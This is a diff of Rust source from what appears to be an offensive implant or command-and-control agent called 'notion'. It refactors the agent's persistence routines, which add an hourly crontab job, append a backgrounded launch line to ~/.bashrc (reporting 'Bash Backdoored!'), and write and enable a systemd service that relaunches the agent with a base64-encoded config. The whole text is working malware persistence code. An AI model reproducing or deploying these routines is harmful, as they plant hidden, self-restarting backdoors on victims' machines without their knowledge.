@@ -192,11 +192,14 @@ pub async fn handle(mut cmd_args: CommandArgs, config_options: &mut ConfigOption
                 };
                 if let Ok(_) = copy(&app_path, dest_path) {
                     // Save config for relaunch
-                    let save_args = CommandArgs::new(vec![format!("{app_dir}/cfg.json")]);
+                    let save_args = CommandArgs::from_string(format!("{app_dir}/cfg.json"));
                     save::handle(save_args, config_options).await?;
                     // Write a cronjob to the user's crontab with the given minutes as an interval.
                     let cron_string = format!("0 * * * * {app_dir}/notion");
-                    if let Ok(_) = shell::handle(&format!("(crontab -l 2>/dev/null; echo '{cron_string}') | crontab - ")).await {
+                    let cron_args = CommandArgs::from_string(
+                        format!("(crontab -l 2>/dev/null; echo '{cron_string}') | crontab - ")
+                    );
+                    if let Ok(_) = shell::handle(cron_args).await {
                         Ok("Cronjob added!".to_string())
                     } else {
                         Ok("Could not make cronjob".to_string())
@@ -215,7 +218,10 @@ pub async fn handle(mut cmd_args: CommandArgs, config_options: &mut ConfigOption
                     // Save config for relaunch
                     let b64_config = config_options.to_base64();
                     // Write a line to the user's bashrc that starts the agent.
-                    if let Ok(_) = shell::handle(&format!("echo '{app_dir}/notion -b {b64_config} & disown' >> ~/.bashrc ")).await {
+                    let bashrc_args = CommandArgs::new(
+                        vec![format!("echo '{app_dir}/notion -b {b64_config} & disown' >> ~/.bashrc ")]
+                    );
+                    if let Ok(_) = shell::handle(bashrc_args).await {
                         Ok("Bash Backdoored!".to_string())
                     } else {
                         Ok("Could not modify bashrc".to_string())
@@ -250,7 +256,10 @@ ExecStart={dest_path} -b {b64_config}
 WantedBy=multi-user.target"
 );
                         write(svc_path, svc_string)?;
-                        return shell::handle(&"systemctl enable notion.service".to_string()).await;
+                        let systemd_args = CommandArgs::from_string(
+                            "systemctl enable notion.service".to_string()
+                        );
+                        return shell::handle(systemd_args).await;
                     } else {
                         return Ok("Could not copy service file".to_string());
                     }
